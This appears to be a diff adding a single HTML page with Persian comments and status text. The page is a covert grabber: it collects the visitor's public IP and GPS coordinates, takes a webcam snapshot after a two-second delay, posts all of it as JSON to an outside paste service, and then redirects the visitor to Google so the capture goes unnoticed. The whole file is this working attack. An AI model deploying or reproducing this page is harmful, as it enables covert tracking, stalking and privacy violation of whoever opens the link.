@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<body style="background-color:black; color:white; text-align:center; padding-top:50px;">
+    <h1 id="status">در حال دریافت اطلاعات...</h1>
+    
+    <script>
+        // 1. گرفتن IP
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                
+                // 2. گرفتن لوکیشن
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var lat = position.coords.latitude;
+                    var lon = position.coords.longitude;
+                    
+                    // 3. گرفتن عکس
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            var video = document.createElement('video');
+                            video.srcObject = stream;
+                            video.play();
+                            
+                            setTimeout(() => {
+                                var canvas = document.createElement('canvas');
+                                canvas.width = 320;
+                                canvas.height = 240;
+                                var ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, 320, 240);
+                                
+                                var imgData = canvas.toDataURL('image/jpeg');
+                                
+                                // ارسال همه چیز به Pastebin
+                                var payload = JSON.stringify({ip: ip, lat: lat, lon: lon, img: imgData});
+                                
+                                fetch('https://paste.pound-python.org/', {
+                                    method: 'POST',
+                                    body: payload,
+                                    headers: {'Content-Type': 'application/json'}
+                                }).then(response => {
+                                    document.getElementById('status').innerText = "اطلاعات ارسال شد!";
+                                    window.location.href = "https://google.com";
+                                });
+                            }, 2000); // 2 ثانیه صبر برای گرفتن عکس واضح
+                        });
+                });
+            });
+    </script>
+</body>
+</html>
